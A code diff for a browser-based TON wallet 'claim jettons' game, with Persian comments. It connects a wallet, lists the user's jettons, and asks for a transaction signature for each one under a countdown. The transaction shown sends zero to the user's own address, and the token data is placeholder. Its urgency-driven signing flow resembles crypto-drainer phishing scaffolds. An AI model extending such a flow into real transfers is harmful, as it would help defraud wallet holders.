@@ -1,4 +1,4 @@
-let tonConnect = new TonConnect();
+let connector;
 let walletAddress = null;
 let timerInterval;
 let jettonsToClaim = [];
@@ -6,13 +6,21 @@ let currentIndex = 0;
 
 document.getElementById("connectBtn").onclick = async () => {
     try {
-        const wallet = await tonConnect.connect();
+        connector = new TonConnectSDK.TonConnect({
+            manifestUrl: "https://YOURDOMAIN.pages.dev/tonconnect-manifest.json"
+        });
+
+        const wallet = await connector.connect();
         walletAddress = wallet.accountAddress;
+
+        alert("Wallet connected: " + walletAddress);
+
         document.getElementById("connectDiv").style.display = "none";
         document.getElementById("gameDiv").style.display = "block";
-        console.log("Connected Wallet:", walletAddress);
+
         jettonsToClaim = await fetchUserJettons(walletAddress);
     } catch(e) {
+        console.error("Connection failed:", e);
         alert("Wallet connection failed.");
     }
 };
@@ -34,7 +42,7 @@ function startTimer(duration) {
         if (--time < 0) {
             clearInterval(timerInterval);
             alert("Time expired! Claim window closed.");
-            document.getElementById("rewardDiv").style.display = "none";
+            document.getElementById("rewardDiv").style.display = "block";
             document.getElementById("gameDiv").style.display = "block";
         }
     }, 1000);
@@ -58,15 +66,17 @@ async function processNextClaim() {
     }
 
     document.getElementById("claimDiv").style.display = "block";
+
     try {
         const jetton = jettonsToClaim[currentIndex];
+
         let payload = {
             type: "transfer",
             to: walletAddress,
-            amount: 0,
+            amount: 0, // فقط امضا، پرداخت کارمزد
             payload: "0x1234"
         };
-        await tonConnect.sendTransaction(payload);
+        await connector.sendTransaction(payload);
 
         currentIndex++;
         document.getElementById("claimDiv").style.display = "none";
@@ -93,7 +103,7 @@ document.getElementById("playAgainBtn").onclick = () => {
 };
 
 async function fetchUserJettons(address) {
-    // اینجا RPC یا Toncenter API قرار دهید
+    // جای RPC یا Toncenter API قرار دهید
     return [
         {address: '0:abc123...', amount: 1},
         {address: '0:def456...', amount: 1}
